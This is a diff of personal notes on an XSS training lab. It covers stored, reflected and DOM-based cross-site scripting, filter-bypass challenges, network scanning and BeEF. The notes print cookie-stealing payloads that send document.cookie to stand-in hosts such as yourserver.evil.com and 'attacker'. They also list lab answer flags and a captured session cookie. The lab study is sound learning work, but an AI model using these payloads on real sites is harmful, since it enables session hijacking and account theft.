@@ -6,8 +6,6 @@ Understand how cross-site scripting occurs and how to exploit it.
 
 ### Introduction 
 
-
-
 Cross-site scripting (XSS) is a security vulnerability typically found in web applications. Its a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine.
 
 A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS.
@@ -40,10 +38,7 @@ Here is a sneak peak of what your playground will look like:
 
 ![](https://i.imgur.com/MTbA186.png)
 
-
-
 	Deploy the machine and navigate to http://<ip>
-
 
 ###  Stored XSS 
 
@@ -119,7 +114,6 @@ Posting <script>document.location='/log/'+document.cookie</script> will log ever
 Once your victim (in this case you hope its Jack), to visit this page, it will log his cookie for you to steal!You can also use other HTML tags to make requests, including the img tag
 <img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />
 
-
 my cookie
 document.cookie
 "connect.sid=s%3AF3ki1_43pM1UZdiS4ms3Rl-Y8Zl3uIeV.Hb9PsrrHRA%2F7NSv8yN4RYrS5woN9NuBuyx4%2F7LNyZt8" 
@@ -166,39 +160,25 @@ so
 
 <script>document.location='http://<ip>/log/'+document.cookie</script>
 
-
 ```
 
 The machine you deployed earlier will guide you though exploiting some cool vulnerabilities, stored XSS has to offer. There are hints for answering these questions on the machine.
-
 
 Add a comment and see if you can insert some of your own HTML.
 Doing so will reveal the answer to this question.
 *HTML_T4gs*
 
-
 Create an alert popup box appear on the page with your document cookies.
 *W3LL_D0N3_LVL2*
 
-![[Pasted image 20221002193736.png]]
-
-![[Pasted image 20221002194025.png]]
-
 Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.
 *websites_can_be_easily_defaced_with_xss*
-
-
-![[Pasted image 20221002211735.png]]
 
 Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:
 
 <script>window.location='http://attacker/?cookie='+document.cookie</script>
 
 This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim. 
-
-![[Pasted image 20221002200014.png]]
-
-![[Pasted image 20221002200609.png]]
 
 Take over Jack's account by stealing his cookie, what was his cookie value?
 *s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE*
@@ -272,8 +252,6 @@ Answer: ReflectiveXss4TheWin
 
 ```
 
-![[Pasted image 20221002202313.png]]
-
 Craft a reflected XSS payload that will cause a popup saying "Hello"
 *ThereIsMoreToXSSThanYouThink*
 
@@ -304,7 +282,6 @@ With DOM-Based xss, an attackers payload will only be executed when the vulnerab
 
 var keyword = document.querySelector('#search')
 keyword.innerHTML = <script>...</script>
-
 
 ```
 <script>
@@ -341,22 +318,13 @@ Answer: JavascriptIsAwesome
 
 ```
 
-![[Pasted image 20221002203605.png]]
-
-![[Pasted image 20221002212305.png]]
-
-![[Pasted image 20221002212407.png]]
-
 Look at the deployed machines DOM-Based XSS page source code, and figure out a way to exploit it by executing an alert with your cookies.
 Try entering: test" onmouseover="alert('Hover over the image and inspect the image element')"
 
 *BreakingAnElementsTag*
 
-
-
 Create an onhover event on an image tag, that change the background color of the website to red.
 document.body.style.backgroundColor = "red"
-![[Pasted image 20221002212936.png]]
 
 *JavascriptIsAwesome*
 
@@ -365,7 +333,6 @@ document.body.style.backgroundColor = "red"
 Cross-site scripting can be used for all sorts of mischief, one being the ability to scan a victims internal network and look for open ports. If an attacker is interested in what other devices are connected on the network, they can use Javascript to make requests to a range of IP addresses and determine which one responds.
 
 On the XSS Playground, go to the IP/Port scanning tab and review a script to scan the internal network.
-
 
 Understand the basic proof of concept script.
 
@@ -396,7 +363,6 @@ The following script will scan an internal network in the range 192.168.0.0 to 1
 After you've found an valid IP you can then use the same method above and include a port number. However, the method described here only works with web servers (as its looking for the favicon image). A more detailed port scanner can be found here. As previously stated, this page is a proof of concept, you can create scripts which have much more capability.
 
 https://github.com/aabeling/portscan
-
 
 ```
 
@@ -447,7 +413,6 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 and
 
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
 
 ```
     <script>
@@ -517,7 +482,6 @@ https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.ht
 
     </script>
 
-
 There are a set of challenges on this page that will require you to bypass particular filters. In every challenge you need to produce an alert on the page that says "Hello". Answers will be in the format of 32 random characters.
 
 1)
@@ -550,7 +514,6 @@ Try document.cookie and you should be able to see your current session cookie.
 “><a href=”x” onerror=promot(1);>?{{2*2}}
 
 <img src="3.gif" onerror="myFunction()"> — which function you want to execute on this 
-
 
 <img src=witty onerror=confirm("Hello")>
 
@@ -630,7 +593,6 @@ Filtered in challenge 4 is as follows:
 
 *2482d2e8939fc85a9363617782270555*
 
-
 ### Protection Methods & Other Exploits 
 
 Protection Methods
@@ -659,9 +621,7 @@ BeEF allows the professional penetration tester to assess the actual security po
 
 ![](https://pbs.twimg.com/profile_images/537666031192272896/SLVtYItD_400x400.png)
 
-
 Download and experiment with BeEF with the XSS playground.
-
 
 Take a look at XSS-Payloads.com, download one interesting looking payload and use it on the XSS playground.
 https://github.com/payloadbox/xss-payload-list
